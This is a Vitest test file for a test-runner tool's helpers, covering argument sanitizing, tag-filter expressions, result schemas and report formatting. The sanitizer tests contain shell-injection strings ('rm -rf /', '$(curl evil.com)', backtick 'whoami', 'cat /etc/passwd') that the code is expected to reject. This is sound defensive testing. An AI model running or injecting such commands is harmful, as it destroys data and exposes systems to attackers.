import type { DataReader } from "@vitest-agent/engine";
import { DataStore } from "@vitest-agent/engine";
import { DataStoreTestLayer } from "@vitest-agent/engine/testing";
import { Effect, Exit, Fiber, Schema } from "effect";
import { describe, expect, it } from "vitest";
import type { RunTestsResultType } from "../src/tools/run-tests.js";
import {
	RunTestsResult,
	coerceErrors,
	composeTagExpression,
	formatReportJson,
	makeBestEffortFork,
	sanitizeTestArgs,
} from "../src/tools/run-tests.js";

describe("makeBestEffortFork (issue #330)", () => {
	const services = () =>
		Effect.runPromise(Effect.context<DataReader | DataStore>().pipe(Effect.provide(DataStoreTestLayer)));

	it("runs the forked effect against the provided services", async () => {
		const runFork = makeBestEffortFork(await services());
		let sawStore = false;
		const fiber = runFork(
			Effect.gen(function* () {
				yield* DataStore;
				sawStore = true;
			}),
		);
		const exit = await Effect.runPromise(Fiber.await(fiber));
		expect(Exit.isSuccess(exit)).toBe(true);
		expect(sawStore).toBe(true);
	});

	it("absorbs a typed failure: the fiber exits successfully instead of failing", async () => {
		const runFork = makeBestEffortFork(await services());
		const fiber = runFork(Effect.fail(new Error("association failed")));
		const exit = await Effect.runPromise(Fiber.await(fiber));
		expect(Exit.isSuccess(exit)).toBe(true);
	});

	it("does not absorb a defect: a bug in the forked effect still fails the fiber", async () => {
		const runFork = makeBestEffortFork(await services());
		const fiber = runFork(Effect.die(new Error("bug")));
		const exit = await Effect.runPromise(Fiber.await(fiber));
		expect(Exit.isFailure(exit)).toBe(true);
	});
});

describe("sanitizeTestArgs", () => {
	it("allows file paths", () => {
		expect(sanitizeTestArgs(["src/index.test.ts"])).toEqual(["src/index.test.ts"]);
	});

	it("allows --project flag", () => {
		expect(sanitizeTestArgs(["--project", "core"])).toEqual(["--project", "core"]);
	});

	it("rejects command injection via semicolons", () => {
		expect(() => sanitizeTestArgs(["src/test.ts; rm -rf /"])).toThrow();
	});

	it("rejects command injection via backticks", () => {
		expect(() => sanitizeTestArgs(["`whoami`"])).toThrow();
	});

	it("rejects command injection via $() substitution", () => {
		expect(() => sanitizeTestArgs(["$(curl evil.com)"])).toThrow();
	});

	it("rejects pipe characters", () => {
		expect(() => sanitizeTestArgs(["test.ts | cat /etc/passwd"])).toThrow();
	});

	it("allows relative paths with slashes and dots", () => {
		expect(sanitizeTestArgs(["./packages/reporter/src/utils/ansi.test.ts"])).toEqual([
			"./packages/reporter/src/utils/ansi.test.ts",
		]);
	});

	it("rejects shell-metachar injection in tag values", () => {
		expect(() => sanitizeTestArgs(["int;rm -rf /"])).toThrow();
		expect(() => sanitizeTestArgs(["unit`whoami`"])).toThrow();
		expect(() => sanitizeTestArgs(["e2e$(curl evil.com)"])).toThrow();
	});

	it("allows simple alphanumeric tag values", () => {
		expect(sanitizeTestArgs(["int", "e2e-slow", "unit_fast"])).toEqual(["int", "e2e-slow", "unit_fast"]);
	});
});

describe("composeTagExpression", () => {
	it("returns null when given null", () => {
		expect(composeTagExpression(null)).toBeNull();
	});

	it("returns null when given undefined", () => {
		expect(composeTagExpression(undefined)).toBeNull();
	});

	it("returns null when every sub-filter is empty or absent", () => {
		expect(composeTagExpression({})).toBeNull();
		expect(composeTagExpression({ all: [], any: [], none: [] })).toBeNull();
	});

	it("composes a single all filter joined by 'and'", () => {
		expect(composeTagExpression({ all: ["int"] })).toBe("int");
		expect(composeTagExpression({ all: ["int", "slow"] })).toBe("int and slow");
	});

	it("composes a single any filter joined by 'or' inside parentheses when 2+", () => {
		expect(composeTagExpression({ any: ["unit"] })).toBe("unit");
		expect(composeTagExpression({ any: ["unit", "int"] })).toBe("(unit or int)");
		expect(composeTagExpression({ any: ["unit", "int", "e2e"] })).toBe("(unit or int or e2e)");
	});

	it("composes a single none filter as 'not <tag> and not <tag>'", () => {
		expect(composeTagExpression({ none: ["slow"] })).toBe("not slow");
		expect(composeTagExpression({ none: ["slow", "flaky"] })).toBe("not slow and not flaky");
	});

	it("joins all three sub-filters with 'and'", () => {
		expect(
			composeTagExpression({
				all: ["int"],
				any: ["fast", "slow"],
				none: ["flaky"],
			}),
		).toBe("int and (fast or slow) and not flaky");
	});

	it("matches the spec's worked example for 'int and not slow'", () => {
		expect(composeTagExpression({ all: ["int"], none: ["slow"] })).toBe("int and not slow");
	});
});

describe("RunTestsResult schema with no-match", () => {
	it("round-trips a no-match variant", async () => {
		const payload: RunTestsResultType = {
			kind: "no-match",
			projectRoot: "/repo",
			filter: {
				project: "core",
				files: ["packages/core/__test__/empty.test.ts"],
				tags: { all: ["e2e"] },
				resolvedExpression: "e2e",
			},
		};
		// Encode then decode — the schema accepts the new branch.
		const encoded = Schema.encodeUnknownSync(RunTestsResult)(payload);
		const decoded = Schema.decodeUnknownSync(RunTestsResult)(encoded);
		expect(decoded.kind).toBe("no-match");
		if (decoded.kind !== "no-match") return;
		expect(decoded.filter.project).toBe("core");
		expect(decoded.filter.files).toEqual(["packages/core/__test__/empty.test.ts"]);
		expect(decoded.filter.resolvedExpression).toBe("e2e");
	});

	it("accepts the existing ok / timeout / error variants", () => {
		const okEnc = Schema.decodeUnknownSync(RunTestsResult)({
			kind: "ok",
			projectRoot: "/repo",
			scope: { project: null, files: [], tags: null },
			report: {
				timestamp: "2026-05-15T00:00:00.000Z",
				reason: "passed",
				summary: { total: 0, passed: 0, failed: 0, skipped: 0, duration: 0 },
				failed: [],
				unhandledErrors: [],
				failedFiles: [],
			},
			classifications: {},
		});
		expect(okEnc.kind).toBe("ok");
		const timeoutEnc = Schema.decodeUnknownSync(RunTestsResult)({ kind: "timeout", timeoutSeconds: 120 });
		expect(timeoutEnc.kind).toBe("timeout");
		const errorEnc = Schema.decodeUnknownSync(RunTestsResult)({ kind: "error", message: "boom" });
		expect(errorEnc.kind).toBe("error");
		// Issue #461: the typed reason is a declared field, so it survives the
		// wire encoder, and an unknown reason is rejected rather than stripped.
		const staleEnc = Schema.encodeUnknownSync(RunTestsResult)({
			kind: "error",
			reason: "stale-install",
			message: "gone",
		});
		expect(staleEnc).toEqual({ kind: "error", reason: "stale-install", message: "gone" });
		expect(() => Schema.decodeUnknownSync(RunTestsResult)({ kind: "error", reason: "bogus", message: "x" })).toThrow();
	});
});

// Behavior 2 (TDD): discoveryLastScannedAt reflects when discovery last scanned disk.
describe("RunTestsResult discoveryLastScannedAt (issue #100)", () => {
	const minimalReport = {
		timestamp: "2026-05-15T00:00:00.000Z",
		reason: "passed" as const,
		summary: { total: 0, passed: 0, failed: 0, skipped: 0, duration: 0 },
		failed: [],
		unhandledErrors: [],
		failedFiles: [],
	};

	it("should round-trip a string discoveryLastScannedAt on the ok variant", () => {
		const payload: RunTestsResultType = {
			kind: "ok",
			projectRoot: "/repo",
			scope: { project: null, files: [], tags: null },
			report: minimalReport,
			classifications: {},
			discoveryLastScannedAt: "2026-07-01T04:00:00.000Z",
		};
		const encoded = Schema.encodeUnknownSync(RunTestsResult)(payload);
		const decoded = Schema.decodeUnknownSync(RunTestsResult)(encoded);
		expect(decoded.kind).toBe("ok");
		if (decoded.kind !== "ok") return;
		expect(decoded.discoveryLastScannedAt).toBe("2026-07-01T04:00:00.000Z");
	});

	it("should accept null discoveryLastScannedAt when discovery has not scanned yet", () => {
		const decoded = Schema.decodeUnknownSync(RunTestsResult)({
			kind: "ok",
			projectRoot: "/repo",
			scope: { project: null, files: [], tags: null },
			report: minimalReport,
			classifications: {},
			discoveryLastScannedAt: null,
		});
		expect(decoded.kind).toBe("ok");
		if (decoded.kind !== "ok") return;
		expect(decoded.discoveryLastScannedAt).toBeNull();
	});
});

describe("coerceErrors", () => {
	it("extracts message from Error-like objects", () => {
		const result = coerceErrors([new Error("boom")]);
		expect(result).toHaveLength(1);
		expect(result[0].message).toBe("boom");
	});

	it("uses stacks array when present", () => {
		const result = coerceErrors([{ message: "fail", stacks: ["frame1", "frame2"] }]);
		expect(result[0].stacks).toEqual(["frame1", "frame2"]);
	});

	it("wraps stack string into stacks array", () => {
		const result = coerceErrors([{ message: "fail", stack: "at foo:1:1" }]);
		expect(result[0].stacks).toEqual(["at foo:1:1"]);
	});

	it("prefers stacks over stack when both are present", () => {
		const result = coerceErrors([{ message: "fail", stacks: ["frame1"], stack: "ignored" }]);
		expect(result[0].stacks).toEqual(["frame1"]);
	});

	it("converts non-object values to string messages", () => {
		const result = coerceErrors(["string error", 42, null]);
		expect(result[0].message).toBe("string error");
		expect(result[1].message).toBe("42");
		expect(result[2].message).toBe("null");
	});

	it("returns empty array for empty input", () => {
		expect(coerceErrors([])).toEqual([]);
	});
});

describe("formatReportJson", () => {
	const baseReport = {
		timestamp: "2026-01-01T00:00:00.000Z",
		reason: "passed" as const,
		summary: { total: 1, passed: 1, failed: 0, skipped: 0, duration: 10 },
		failed: [],
		unhandledErrors: [],
		failedFiles: [],
	};

	it("returns the report under a `report` key", () => {
		const parsed = JSON.parse(formatReportJson(baseReport));
		expect(parsed.report).toEqual(baseReport);
	});

	it("omits classifications when none are provided", () => {
		const parsed = JSON.parse(formatReportJson(baseReport));
		expect(parsed.classifications).toBeUndefined();
	});

	it("serializes classifications as a plain object", () => {
		const classifications = new Map<string, string>([
			["Math > adds", "stable"],
			["Math > subs", "new-failure"],
		]);
		const parsed = JSON.parse(formatReportJson(baseReport, classifications));
		expect(parsed.classifications).toEqual({
			"Math > adds": "stable",
			"Math > subs": "new-failure",
		});
	});

	it("produces parseable JSON for a failing report", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "failed" as const,
			summary: { total: 2, passed: 1, failed: 1, skipped: 0, duration: 200 },
			failed: [
				{
					file: "src/math.test.ts",
					state: "failed" as const,
					duration: 50,
					tests: [
						{
							name: "adds numbers",
							fullName: "Math > adds numbers",
							state: "failed" as const,
							duration: 10,
							errors: [{ message: "expected 3 to equal 4", diff: "- 3\n+ 4" }],
						},
					],
				},
			],
			unhandledErrors: [],
			failedFiles: ["src/math.test.ts"],
		};
		const parsed = JSON.parse(formatReportJson(report));
		expect(parsed.report.summary.failed).toBe(1);
		expect(parsed.report.failed[0].file).toBe("src/math.test.ts");
		expect(parsed.report.failed[0].tests[0].errors[0].diff).toBe("- 3\n+ 4");
	});
});
